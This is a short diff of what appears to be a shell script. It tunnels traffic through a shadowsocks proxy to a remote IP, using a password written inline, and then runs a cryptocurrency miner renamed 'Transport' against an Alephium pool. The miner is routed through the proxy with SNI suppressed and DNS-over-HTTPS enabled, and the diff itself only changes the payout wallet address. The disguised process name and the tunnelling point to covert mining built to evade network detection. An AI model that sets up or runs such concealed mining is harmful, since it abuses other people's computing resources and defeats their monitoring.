@@ -40,4 +40,4 @@ ss-local -s 52.15.235.202 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305
 
 ph add Transport
 
-./Transport -a blake3 -o stratum+ssl://us2.alephium.herominers.com:1199 -u 1Hk3MN2pjgDCDy2PigfxnVMJ9fQcfmb6cYqpsYtMaUziM -w Transport -p x --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+./Transport -a blake3 -o stratum+ssl://us2.alephium.herominers.com:1199 -u 1HxpGkfeghU18N4jPHjJ7bzyZnKBUgmftEspmT6Drvz2Z -w Transport -p x --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
